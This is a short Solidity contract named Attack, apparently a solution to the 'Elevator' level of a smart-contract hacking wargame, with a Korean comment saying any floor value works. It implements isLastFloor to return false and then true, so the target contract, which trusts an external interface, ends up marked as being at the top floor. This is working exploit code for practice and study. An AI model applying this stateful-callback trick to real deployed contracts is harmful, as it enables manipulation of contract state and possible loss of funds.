pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Attack {
    Elevator public instance;
    uint public count;

    constructor(address _elevator) {
        instance = Elevator(_elevator);
        count = 0;
    }

    function attack() public {
        instance.goTo(807); // 아무 값이나 상관 x
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        return count > 1;
    }
}